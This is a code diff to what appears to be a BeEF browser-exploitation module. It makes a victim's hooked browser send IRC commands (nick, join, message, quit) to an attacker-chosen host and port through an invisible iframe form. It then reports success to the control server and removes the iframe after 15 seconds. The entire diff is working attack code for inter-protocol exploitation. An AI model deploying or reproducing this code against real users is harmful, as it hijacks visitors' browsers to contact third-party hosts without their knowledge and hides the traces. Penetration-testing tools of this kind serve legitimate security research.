@@ -22,34 +22,25 @@
  */
 beef.execute(function() {
 
-	var server = '<%= @server %>';
-	var port = '<%= @port %>';
-	var nick = '<%= @nick %>';
+	var rhost   = '<%= @rhost %>';
+	var rport   = '<%= @rport %>';
+	var nick    = '<%= @nick %>';
 	var channel = '<%= @channel %>';
 	var message = '<%= @message %>';
 
-	var target = "http://" + server + ":" + port;
-	var irc_commands= "NICK " + nick + "\n";
-	irc_commands+= "USER " + nick + " 8 * : " + nick + " user\n";
-	irc_commands+= "JOIN " + channel + "\n";
-	irc_commands+= "PRIVMSG " + channel + " :" + message + "\n";
+	var irc_commands = "NICK " + nick + "\n";
+	irc_commands    += "USER " + nick + " 8 * : " + nick + " user\n";
+	irc_commands    += "JOIN " + channel + "\n";
+	irc_commands    += "PRIVMSG " + channel + " :" + message + "\nQUIT\n";
 
-	var iframe = beef.dom.createInvisibleIframe();
-
-	var form = document.createElement('form');
-	form.setAttribute('action', target);
-	form.setAttribute('method', 'post');
-	form.setAttribute('enctype', 'multipart/form-data');
-
-	var input = document.createElement('input');
-	input.setAttribute('type', 'hidden');
-	input.setAttribute('name', 'data');
-	input.setAttribute('value', irc_commands);
-	form.appendChild(input);
-
-	iframe.contentWindow.document.body.appendChild(form);
-	form.submit();
-
+	// send commands
+	var irc_iframe = beef.dom.createIframeIpecForm(rhost, rport, irc_commands);
 	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IRC command sent");
+
+	// clean up
+	cleanup = function() {
+		document.body.removeChild(irc_iframe);
+	}
+	setTimeout("cleanup()", 15000);
 
 });
